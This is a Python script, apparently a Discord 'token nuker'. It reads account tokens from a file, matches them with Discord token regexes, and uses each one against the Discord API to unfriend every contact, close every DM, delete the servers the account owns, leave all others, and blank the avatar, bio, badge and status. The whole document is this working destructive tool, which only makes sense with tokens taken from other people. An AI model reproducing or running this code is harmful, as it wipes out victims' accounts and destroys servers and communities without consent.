import asyncio
import aiohttp
from re import findall

tokens = []
for line in [x.strip() for x in open(f"tokens.txt", errors="ignore").readlines() if x.strip()]:
    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}", r"mfa\.[\w-]{84}"):
        for token in findall(regex, line):
            tokens.append(token)

class user:
    async def remove_relationships():
        async with aiohttp.ClientSession() as session:
            for token in tokens:
                response = await session.get('https://discord.com/api/v9/users/@me/relationships', headers={'authorization': token})
                if not response.status in (200,204):
                    print('error finding relationships')
                else:
                    print('successfully found relationships')
                    for user in await response.json():
                        response = await session.delete(f'https://discord.com/api/v9/users/@me/relationships/{user["id"]}', headers={'authorization': token})
                        if not response.status in (200,204):
                            print('error removing relationship')
                        else:
                            print('successfully removed relationship')

    async def remove_hypesquad():
        async with aiohttp.ClientSession() as session:
            for token in tokens:
                response = await session.delete('https://discord.com/api/v9/hypesquad/online', headers={'authorization': token})
                if not response.status in (200,204):
                    print('error removing hypesquad')
                else:
                    print('successfully removed hypesquad')

    async def remove_pfp():
        async with aiohttp.ClientSession() as session:
            for token in tokens:
                response = await session.patch('https://discord.com/api/v9/users/@me', headers={'authorization': token}, json={'avatar': None})
                if not response.status in (200,204):
                    print('error removing pfp')
                else:
                    print('successfully removed pfp')

    async def remove_dms():
        async with aiohttp.ClientSession() as session:
            for token in tokens:
                response = await session.get('https://discord.com/api/v9/users/@me/channels', headers={'authorization': token})
                if not response.status in (200,204):
                    print('error finding dms')
                else:
                    print('successfully found dms')
                    for channel in await response.json():
                        response = await session.delete(f'https://discord.com/api/v9/channels/{channel["id"]}', headers={'authorization': token})
                        if not response.status in (200,204):
                            print('error removing dm')
                        else:
                           print('successfully removed dm')

    async def remove_servers():
        async with aiohttp.ClientSession() as session:
            for token in tokens:
                response = await session.get('https://discord.com/api/v9/users/@me/guilds', headers={'authorization': token})
                if not response.status in (200,204):
                    print('error finding servers')
                else:
                    print('successfully found servers')
                    for server in await response.json():
                        if server['owner']:
                            await session.delete(f'https://discord.com/api/v9/guilds/{server["id"]}', headers={'authorization': token})
                            if not response.status in (200,204):
                                print('error deleting server')
                            else:
                                print('successfully deleted server')
                        elif not server['owner']:
                            await session.delete(f'https://discord.com/api/v9/users/@me/guilds/{server["id"]}', headers={'authorization': token})
                            if not response.status in (200,204):
                                print('error removing server')
                            else:
                                print('successfully removed server')

    async def remove_bio():
        async with aiohttp.ClientSession() as session:
            for token in tokens:
                response = await session.patch('https://discord.com/api/v9/users/@me/profile', json={'bio': ""},headers={'authorization': token})
                if not response.status in (200,204):
                    print('error removing bio')
                else:
                    print('successfully removed bio')

    async def remove_status():
        async with aiohttp.ClientSession() as session:
            for token in tokens:
                response = await session.patch('https://discord.com/api/v9/users/@me/settings-proto/1', json={'settings': "WgoKCAoGb25saW5l"},headers={'authorization': token})
                if not response.status in (200,204):
                    print('error removing status')
                else:
                    print('successfully removed status')

if __name__ == "__main__":
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    asyncio.run(user.remove_relationships())
    asyncio.run(user.remove_hypesquad())
    asyncio.run(user.remove_pfp())
    asyncio.run(user.remove_dms())
    asyncio.run(user.remove_servers())
    asyncio.run(user.remove_bio())
    asyncio.run(user.remove_status())